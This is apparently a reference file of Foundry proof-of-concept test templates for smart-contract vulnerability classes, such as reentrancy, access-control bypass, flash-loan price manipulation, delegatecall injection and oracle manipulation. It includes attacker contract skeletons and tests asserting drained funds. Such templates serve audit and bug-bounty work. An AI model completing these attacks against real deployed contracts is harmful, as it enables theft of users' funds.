# PoC Templates by Bug Class

Detailed Foundry PoC templates for each vulnerability class.

## Reentrancy PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Attacker contract with reentrancy callback
contract ReentrancyAttacker {
    address public target;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _target, uint256 _maxAttacks) {
        target = _target;
        maxAttacks = _maxAttacks;
    }

    function attack() external payable {
        // Step 1: Initial deposit/interaction
        // target.deposit{value: msg.value}();

        // Step 2: Trigger vulnerable function
        // target.withdraw(msg.value);
    }

    // Reentrancy callback
    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= 1 ether) {
            attackCount++;
            // Re-enter vulnerable function
            // ITarget(target).withdraw(1 ether);
        }
    }

    fallback() external payable {
        // For non-ETH reentrancy (ERC777, etc.)
    }
}

contract PoC_Reentrancy is Test {
    // Target contract
    // VulnerableContract target;
    ReentrancyAttacker attacker;

    address attackerEOA = address(0xBAD);
    address victim = address(0x1);

    function setUp() public {
        // Deploy target
        // target = new VulnerableContract();

        // Seed target with victim funds
        // vm.deal(victim, 100 ether);
        // vm.prank(victim);
        // target.deposit{value: 100 ether}();

        // Deploy attacker contract
        // attacker = new ReentrancyAttacker(address(target), 10);
    }

    function test_Exploit_Reentrancy() public {
        uint256 targetBefore = address(target).balance;

        // Fund and execute attack
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}();

        uint256 targetAfter = address(target).balance;
        uint256 stolen = targetBefore - targetAfter;

        console.log("Stolen:", stolen / 1e18, "ETH");
        assertGt(stolen, 1 ether, "Should drain more than deposited");
    }
}
```

## Access Control PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract PoC_AccessControl is Test {
    // Target contract
    // VulnerableContract target;

    address attacker = address(0xBAD);
    address admin = address(0xADM);
    address user = address(0x1);

    function setUp() public {
        // Deploy target with admin
        // vm.prank(admin);
        // target = new VulnerableContract();

        // Setup initial state
        // vm.deal(address(target), 100 ether);
    }

    function test_Exploit_MissingAccessControl() public {
        // Verify attacker is not privileged
        // assertFalse(target.isAdmin(attacker));

        // Attacker calls privileged function without auth
        vm.prank(attacker);
        // target.adminWithdraw(address(target).balance);

        // Verify unauthorized access succeeded
        // assertEq(address(target).balance, 0, "Attacker drained funds");
    }

    function test_Exploit_PrivilegeEscalation() public {
        // Verify attacker starts unprivileged
        // assertFalse(target.hasRole(ADMIN_ROLE, attacker));

        // Attacker escalates privileges
        vm.prank(attacker);
        // target.grantRole(ADMIN_ROLE, attacker);

        // Verify escalation succeeded
        // assertTrue(target.hasRole(ADMIN_ROLE, attacker));
    }

    function test_Exploit_RoleConfusion() public {
        // Setup: attacker has OPERATOR role, not ADMIN
        // vm.prank(admin);
        // target.grantRole(OPERATOR_ROLE, attacker);

        // Attacker exploits role confusion
        vm.prank(attacker);
        // target.adminOnlyFunction(); // Should fail but doesn't

        // Verify exploit
    }
}
```

## Flash Loan PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Flash loan callback interface
interface IFlashLoanReceiver {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

contract FlashLoanAttacker is IFlashLoanReceiver {
    address public target;
    address public flashLender;

    constructor(address _target, address _flashLender) {
        target = _target;
        flashLender = _flashLender;
    }

    function attack(uint256 loanAmount) external {
        // Initiate flash loan
        // IFlashLender(flashLender).flashLoan(
        //     address(this),
        //     token,
        //     loanAmount,
        //     ""
        // );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Step 1: Manipulate price/state
        // Step 2: Exploit vulnerable protocol
        // Step 3: Repay flash loan

        // Approve repayment
        // IERC20(token).approve(msg.sender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract PoC_FlashLoan is Test {
    // Target contracts
    // VulnerableProtocol target;
    // IFlashLender flashLender;
    // IERC20 token;

    FlashLoanAttacker attacker;
    address attackerEOA = address(0xBAD);

    function setUp() public {
        // Fork mainnet for real flash loan providers
        // vm.createSelectFork("mainnet", blockNumber);

        // Or deploy mock flash lender
        // flashLender = new MockFlashLender();
        // target = new VulnerableProtocol();

        // Deploy attacker
        // attacker = new FlashLoanAttacker(address(target), address(flashLender));
    }

    function test_Exploit_FlashLoanPriceManipulation() public {
        // Record initial state
        // uint256 attackerBefore = token.balanceOf(attackerEOA);

        // Execute flash loan attack
        vm.prank(attackerEOA);
        // attacker.attack(1_000_000 ether);

        // Verify profit
        // uint256 attackerAfter = token.balanceOf(attackerEOA);
        // assertGt(attackerAfter, attackerBefore, "Should profit");
    }
}
```

## Input Validation PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract PoC_InputValidation is Test {
    // Target contract
    // VulnerableContract target;

    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy target
        // target = new VulnerableContract();
        // vm.deal(address(target), 100 ether);
    }

    function test_Exploit_MissingZeroAddressCheck() public {
        vm.prank(attacker);
        // target.setRecipient(address(0)); // Should revert but doesn't

        // Funds sent to zero address are burned
        // target.sendFunds();
        // assertEq(address(0).balance, X); // Funds lost
    }

    function test_Exploit_MissingSlippageProtection() public {
        // Setup: manipulate pool price
        // largeSwapToManipulatePrice();

        vm.prank(attacker);
        // Victim's swap with amountOutMin = 0
        // target.swap(amountIn, 0, path); // Sandwich attack succeeds

        // Verify victim received far less than expected
    }

    function test_Exploit_MissingBoundsCheck() public {
        vm.prank(attacker);
        // Set fee to 100% (10000 basis points)
        // target.setFee(10000);

        // Protocol now takes all funds
        // uint256 amount = target.deposit{value: 1 ether}();
        // assertEq(amount, 0, "Fee took everything");
    }

    function test_Exploit_UnsafeCast() public {
        vm.prank(attacker);
        // Overflow via unsafe downcast
        // target.setAmount(type(uint256).max);

        // Verify truncation occurred
        // assertLt(target.storedAmount(), type(uint256).max);
    }

    function test_Exploit_ArrayDoS() public {
        // Fill array to cause gas exhaustion
        for (uint i = 0; i < 10000; i++) {
            // target.addItem(i);
        }

        // Function now exceeds block gas limit
        // vm.expectRevert();
        // target.processAll{gas: 30_000_000}();
    }
}
```

## Logic Error PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract PoC_LogicError is Test {
    // Target contract
    // VulnerableContract target;

    address attacker = address(0xBAD);
    address victim = address(0x1);

    function setUp() public {
        // Deploy target
        // target = new VulnerableContract();
    }

    function test_Exploit_CalculationError() public {
        // Setup initial state
        vm.deal(address(target), 100 ether);

        vm.prank(attacker);
        // Exploit incorrect calculation
        // uint256 shares = target.deposit{value: 1 ether}();

        // Verify more shares than expected due to calc error
        // assertGt(shares, expectedShares);
    }

    function test_Exploit_StateInconsistency() public {
        // Create inconsistent state
        vm.prank(attacker);
        // target.partialUpdate(); // Updates A but not B

        // Exploit inconsistency
        // target.exploit(); // Uses stale B value
    }

    function test_Exploit_RoundingError() public {
        // Small deposits to accumulate rounding errors
        for (uint i = 0; i < 100; i++) {
            vm.prank(attacker);
            // target.deposit{value: 1 wei}();
        }

        // Withdraw exploiting accumulated rounding
        vm.prank(attacker);
        // uint256 withdrawn = target.withdrawAll();
        // assertGt(withdrawn, 100 wei, "Profit from rounding");
    }

    function test_Exploit_BusinessLogicBypass() public {
        // Bypass intended business logic
        vm.prank(attacker);
        // target.bypassCheck(); // Skips validation

        // Achieve unintended state
    }
}
```

## External Call PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Malicious contract for callback attacks
contract MaliciousCallback {
    address public target;
    bool public attacked;

    constructor(address _target) {
        target = _target;
    }

    // Callback function that exploits
    function onCallback(bytes calldata data) external {
        // Exploit during callback
        attacked = true;
    }

    fallback() external payable {
        // Generic callback handler
    }
}

contract PoC_ExternalCall is Test {
    // Target contract
    // VulnerableContract target;

    MaliciousCallback malicious;
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy target
        // target = new VulnerableContract();

        // Deploy malicious callback contract
        // malicious = new MaliciousCallback(address(target));
    }

    function test_Exploit_UncheckedReturnValue() public {
        // Deploy token that returns false on transfer
        // MockBadToken badToken = new MockBadToken();

        vm.prank(attacker);
        // target.withdrawToken(address(badToken), 100); // Silent failure

        // Funds not transferred but state updated
    }

    function test_Exploit_DelegatecallInjection() public {
        // Craft malicious calldata
        bytes memory maliciousData = abi.encodeWithSignature(
            "selfdestruct(address)",
            attacker
        );

        vm.prank(attacker);
        // target.execute(maliciousImplementation, maliciousData);

        // Verify target destroyed or state corrupted
    }

    function test_Exploit_CallbackManipulation() public {
        // Register malicious callback receiver
        vm.prank(attacker);
        // target.setCallbackReceiver(address(malicious));

        // Trigger callback
        // target.triggerCallback();

        // Verify malicious callback executed
        // assertTrue(malicious.attacked());
    }

    function test_Exploit_CrossContractReentrancy() public {
        // Contract A calls Contract B calls Contract A
        // More complex reentrancy across multiple contracts

        vm.prank(attacker);
        // contractA.startAttack();

        // Verify cross-contract reentrancy exploited
    }
}
```

## Common Patterns

### Fork Testing Setup

```solidity
function setUp() public {
    // Fork mainnet at specific block
    vm.createSelectFork("mainnet", 18000000);

    // Get existing contracts
    target = ITarget(MAINNET_TARGET_ADDRESS);
    token = IERC20(MAINNET_TOKEN_ADDRESS);
}
```

### Mock Oracle Manipulation

```solidity
contract MockOracle {
    int256 public price;

    function setPrice(int256 _price) external {
        price = _price;
    }

    function latestAnswer() external view returns (int256) {
        return price;
    }
}

function test_Exploit_OracleManipulation() public {
    MockOracle oracle = new MockOracle();

    // Set manipulated price
    oracle.setPrice(1e8); // $1

    // Replace oracle in target
    vm.store(
        address(target),
        ORACLE_SLOT,
        bytes32(uint256(uint160(address(oracle))))
    );

    // Exploit with manipulated price
    vm.prank(attacker);
    target.exploit();
}
```

### Multi-Block Attack

```solidity
function test_Exploit_MultiBlock() public {
    // Block 1: Setup
    vm.prank(attacker);
    target.setupAttack();

    // Advance blocks
    vm.roll(block.number + 10);
    vm.warp(block.timestamp + 10 minutes);

    // Block 2: Execute
    vm.prank(attacker);
    target.executeAttack();
}
```

### ERC20 Token Setup

```solidity
function setUp() public {
    // Deploy mock token
    token = new MockERC20("Test", "TST", 18);

    // Mint to actors
    token.mint(address(target), 1_000_000e18);
    token.mint(attacker, 1_000e18);

    // Or use deal for existing tokens
    deal(address(USDC), attacker, 1_000_000e6);
}
```
